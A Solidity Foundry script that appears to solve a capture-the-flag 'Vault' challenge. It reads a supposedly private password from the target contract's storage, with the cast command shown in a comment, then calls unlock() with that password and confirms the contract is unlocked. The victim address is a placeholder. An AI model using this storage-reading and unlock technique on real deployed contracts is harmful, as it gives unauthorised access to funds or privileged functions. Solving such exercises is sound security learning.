// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

contract AttackVault is Script {
    address constant VICTIM = address(0); // TODO: Add the victim address

    function run() public {
        vm.startBroadcast();
        // We can directly read the storage layout using a tool like cast:
        // cast storage <VICTIM_CONTRACT_ADDRESS> 1 -rpc-url $RPC_URL --private-key $PK
        bytes32 password = bytes32(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        bytes4 selector = bytes4(keccak256(abi.encodePacked("unlock(bytes32)")));
        (bool success,) = VICTIM.call(abi.encodeWithSelector(selector, password));
        require(success, "failed to call victim");

        selector = bytes4(keccak256(abi.encodePacked("locked()")));
        (bool success1, bytes memory data) = VICTIM.call(abi.encodeWithSelector(selector));
        require(success1, "failed to call locked() on victim");
        bool isLocked = abi.decode(data, (bool));
        require(!isLocked, "contract is still locked");
        vm.stopBroadcast();
    }
}
